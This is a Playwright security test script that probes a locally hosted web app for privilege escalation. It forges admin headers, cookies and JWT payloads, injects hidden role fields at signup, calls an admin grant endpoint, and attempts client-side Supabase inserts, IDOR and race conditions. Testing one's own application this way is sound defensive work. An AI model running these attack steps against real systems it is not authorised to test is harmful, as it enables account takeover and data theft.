const { chromium } = require('playwright');

// Test Configuration
const BASE_URL = 'http://localhost:3001';
const TEST_EMAIL = `test_${Date.now()}@example.com`;
const TEST_PASSWORD = 'TestPassword123!';
const ADMIN_EMAIL = 'sam@gymleadhub.co.uk'; // Known admin from rbac.ts

// Vulnerability findings storage
const findings = [];

// Helper to log findings
function logVulnerability(severity, title, details, stepsToReproduce, impact) {
  const finding = {
    severity,
    title,
    details,
    stepsToReproduce,
    impact,
    timestamp: new Date().toISOString()
  };
  findings.push(finding);
  console.log(`\n🔴 VULNERABILITY FOUND: ${title}`);
  console.log(`Severity: ${severity}`);
  console.log(`Details: ${details}`);
  console.log(`Impact: ${impact}`);
}

async function testPrivilegeEscalation() {
  const browser = await chromium.launch({
    headless: false,
    devtools: true
  });

  const context = await browser.newContext({
    ignoreHTTPSErrors: true,
    recordVideo: { dir: './videos/' }
  });

  // Enable request interception
  await context.route('**/*', async (route) => {
    const request = route.request();
    const url = request.url();

    // Log all API calls for analysis
    if (url.includes('/api/') || url.includes('/admin/')) {
      console.log(`[API] ${request.method()} ${url}`);

      // Try to modify authorization headers
      if (url.includes('/admin/')) {
        const headers = {
          ...request.headers(),
          'X-Admin-Override': 'true',
          'X-User-Role': 'superadmin',
          'X-Bypass-Auth': 'true'
        };
        console.log('[ATTACK] Injecting malicious headers on admin route');
      }
    }

    await route.continue();
  });

  const page = await context.newPage();

  console.log('\n=== PRIVILEGE ESCALATION TESTING ===\n');

  // Test 1: Direct access to admin endpoints without authentication
  console.log('\n[TEST 1] Testing unauthenticated admin access...');
  try {
    // Try direct admin routes
    const adminRoutes = [
      '/admin',
      '/admin-direct',
      '/admin-debug',
      '/saas-admin',
      '/admin/organizations',
      '/admin/billing',
      '/admin/simple-dashboard',
      '/api/admin/grant-access',
      '/api/admin/users',
      '/api/admin/organizations'
    ];

    for (const route of adminRoutes) {
      const response = await page.goto(BASE_URL + route, { waitUntil: 'networkidle' });
      const status = response?.status();
      const content = await page.content();

      console.log(`  ${route}: Status ${status}`);

      // Check if we can access admin content without auth
      if (status === 200 && (content.includes('Admin') || content.includes('Dashboard'))) {
        logVulnerability(
          'CRITICAL',
          'Unauthenticated Admin Access',
          `Admin route ${route} accessible without authentication`,
          [`1. Navigate to ${BASE_URL}${route} without logging in`,
           '2. Admin content is displayed'],
          'Attackers can access admin functionality without credentials'
        );
      }

      // Check for information disclosure in redirects
      if (response?.headers()['location']) {
        console.log(`  Redirect location: ${response.headers()['location']}`);
      }
    }
  } catch (error) {
    console.log(`  Error during unauthenticated test: ${error.message}`);
  }

  // Test 2: Create a regular user and attempt privilege escalation
  console.log('\n[TEST 2] Creating regular user account...');

  // Sign up as regular user
  await page.goto(BASE_URL + '/signup');
  await page.waitForLoadState('networkidle');

  // Fill signup form
  await page.fill('input[type="email"]', TEST_EMAIL);
  await page.fill('input[type="password"]', TEST_PASSWORD);

  // Attempt to inject admin role during signup
  await page.evaluate(() => {
    // Try to add hidden fields
    const form = document.querySelector('form');
    if (form) {
      const roleInput = document.createElement('input');
      roleInput.type = 'hidden';
      roleInput.name = 'role';
      roleInput.value = 'superadmin';
      form.appendChild(roleInput);

      const adminInput = document.createElement('input');
      adminInput.type = 'hidden';
      adminInput.name = 'is_admin';
      adminInput.value = 'true';
      form.appendChild(adminInput);
    }
  });

  await page.click('button[type="submit"]');
  await page.waitForTimeout(3000);

  // Test 3: Attempt to grant ourselves admin access via API
  console.log('\n[TEST 3] Testing admin grant endpoint exploitation...');

  try {
    // Try to call admin grant endpoint directly
    const grantResponse = await page.evaluate(async (email) => {
      const response = await fetch('/api/admin/grant-access', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Admin-Override': 'true'
        },
        body: JSON.stringify({ email: email })
      });
      return {
        status: response.status,
        data: await response.text()
      };
    }, TEST_EMAIL);

    console.log(`  Grant access response: ${grantResponse.status}`);

    if (grantResponse.status === 200) {
      logVulnerability(
        'CRITICAL',
        'Unauthorized Admin Grant Access',
        'Non-admin users can grant themselves admin privileges',
        ['1. Create regular user account',
         '2. Call POST /api/admin/grant-access with own email',
         '3. Admin access is granted'],
        'Any user can escalate to super admin privileges'
      );
    }
  } catch (error) {
    console.log(`  Grant access test error: ${error.message}`);
  }

  // Test 4: Cookie and session manipulation
  console.log('\n[TEST 4] Testing session/cookie manipulation...');

  const cookies = await context.cookies();
  console.log(`  Found ${cookies.length} cookies`);

  for (const cookie of cookies) {
    if (cookie.name.includes('session') || cookie.name.includes('auth')) {
      // Try to modify session cookies
      await context.addCookies([{
        ...cookie,
        value: cookie.value.replace('member', 'superadmin').replace('user', 'admin')
      }]);
      console.log(`  Modified cookie: ${cookie.name}`);
    }
  }

  // Add fake admin session cookies
  await context.addCookies([
    {
      name: 'admin_session',
      value: 'fake_admin_token',
      domain: 'localhost',
      path: '/'
    },
    {
      name: 'user_role',
      value: 'superadmin',
      domain: 'localhost',
      path: '/'
    }
  ]);

  // Test with modified cookies
  await page.goto(BASE_URL + '/admin-direct');
  const adminContent = await page.content();
  if (adminContent.includes('Admin Direct Access') && !adminContent.includes('Access Denied')) {
    logVulnerability(
      'HIGH',
      'Cookie-based Privilege Escalation',
      'Admin access granted through cookie manipulation',
      ['1. Login as regular user',
       '2. Modify session cookies to include admin role',
       '3. Access admin pages'],
      'Users can escalate privileges by modifying client-side cookies'
    );
  }

  // Test 5: Direct Supabase manipulation
  console.log('\n[TEST 5] Testing direct database manipulation...');

  try {
    const supabaseTest = await page.evaluate(async () => {
      // Try to directly access Supabase client
      if (window.supabase) {
        // Attempt to insert into super_admin_users table
        const { data, error } = await window.supabase
          .from('super_admin_users')
          .insert({
            user_id: 'test-user-id',
            role: 'super_admin',
            is_active: true
          });

        return { success: !error, error: error?.message };
      }
      return { success: false, error: 'No Supabase client found' };
    });

    if (supabaseTest.success) {
      logVulnerability(
        'CRITICAL',
        'Direct Database Manipulation',
        'Client-side Supabase allows direct admin table modification',
        ['1. Access any page with Supabase client',
         '2. Use browser console to insert into super_admin_users',
         '3. Grant admin privileges to any user'],
        'Complete authorization bypass through client-side database access'
      );
    }
  } catch (error) {
    console.log(`  Supabase test error: ${error.message}`);
  }

  // Test 6: IDOR and horizontal privilege escalation
  console.log('\n[TEST 6] Testing IDOR vulnerabilities...');

  const idorEndpoints = [
    '/api/organizations/1',
    '/api/organizations/2',
    '/api/users/1',
    '/api/users/2',
    '/settings?org_id=1',
    '/settings?org_id=2'
  ];

  for (const endpoint of idorEndpoints) {
    try {
      const response = await page.evaluate(async (url) => {
        const resp = await fetch(url);
        return {
          status: resp.status,
          data: await resp.text()
        };
      }, BASE_URL + endpoint);

      if (response.status === 200) {
        console.log(`  IDOR found: ${endpoint} - Status 200`);
        logVulnerability(
          'HIGH',
          'Insecure Direct Object Reference',
          `Unauthorized access to ${endpoint}`,
          [`1. Login as regular user`,
           `2. Access ${endpoint}`,
           '3. View/modify other organizations data'],
          'Users can access data from other organizations'
        );
      }
    } catch (error) {
      console.log(`  IDOR test error for ${endpoint}: ${error.message}`);
    }
  }

  // Test 7: Race condition in role assignment
  console.log('\n[TEST 7] Testing race conditions...');

  const racePromises = [];
  for (let i = 0; i < 10; i++) {
    racePromises.push(
      page.evaluate(async (email) => {
        return fetch('/api/admin/grant-access', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
      }, TEST_EMAIL)
    );
  }

  try {
    await Promise.all(racePromises);
    console.log('  Sent 10 concurrent admin grant requests');
  } catch (error) {
    console.log(`  Race condition test error: ${error.message}`);
  }

  // Test 8: Parameter pollution
  console.log('\n[TEST 8] Testing parameter pollution...');

  const pollutedUrls = [
    '/admin?user=true&admin=true',
    '/admin?role=member&role=superadmin',
    '/api/admin/grant-access?bypass=true',
    '/settings?org_id=1&org_id=2&org_id=admin'
  ];

  for (const url of pollutedUrls) {
    try {
      const response = await page.goto(BASE_URL + url);
      console.log(`  ${url}: Status ${response?.status()}`);
    } catch (error) {
      console.log(`  Parameter pollution test error: ${error.message}`);
    }
  }

  // Test 9: JWT manipulation if tokens are used
  console.log('\n[TEST 9] Testing JWT manipulation...');

  try {
    const localStorage = await page.evaluate(() => {
      return Object.keys(window.localStorage).reduce((acc, key) => {
        acc[key] = window.localStorage.getItem(key);
        return acc;
      }, {});
    });

    for (const [key, value] of Object.entries(localStorage)) {
      if (value && typeof value === 'string' && value.includes('.')) {
        console.log(`  Found potential JWT in ${key}`);

        // Try to decode and modify
        const parts = value.split('.');
        if (parts.length === 3) {
          try {
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
            console.log(`  JWT payload:`, payload);

            // Modify payload
            payload.role = 'superadmin';
            payload.is_admin = true;

            const newPayload = Buffer.from(JSON.stringify(payload)).toString('base64');
            const modifiedJWT = `${parts[0]}.${newPayload}.${parts[2]}`;

            await page.evaluate((key, token) => {
              window.localStorage.setItem(key, token);
            }, key, modifiedJWT);

            console.log('  Modified JWT with admin role');
          } catch (e) {
            console.log(`  JWT decode error: ${e.message}`);
          }
        }
      }
    }
  } catch (error) {
    console.log(`  JWT test error: ${error.message}`);
  }

  // Generate final report
  console.log('\n\n=== VULNERABILITY REPORT ===\n');
  console.log(`Total vulnerabilities found: ${findings.length}`);

  const criticalCount = findings.filter(f => f.severity === 'CRITICAL').length;
  const highCount = findings.filter(f => f.severity === 'HIGH').length;
  const mediumCount = findings.filter(f => f.severity === 'MEDIUM').length;

  console.log(`Critical: ${criticalCount}`);
  console.log(`High: ${highCount}`);
  console.log(`Medium: ${mediumCount}`);

  console.log('\n=== DETAILED FINDINGS ===\n');
  findings.forEach((finding, index) => {
    console.log(`\n[${index + 1}] ${finding.title}`);
    console.log(`Severity: ${finding.severity}`);
    console.log(`Details: ${finding.details}`);
    console.log(`Steps to Reproduce:`);
    finding.stepsToReproduce.forEach(step => console.log(`  ${step}`));
    console.log(`Impact: ${finding.impact}`);
    console.log('---');
  });

  // Save report to file
  const fs = require('fs');
  fs.writeFileSync('privilege-escalation-report.json', JSON.stringify(findings, null, 2));
  console.log('\n Report saved to privilege-escalation-report.json');

  await browser.close();
}

// Run the test
testPrivilegeEscalation().catch(console.error);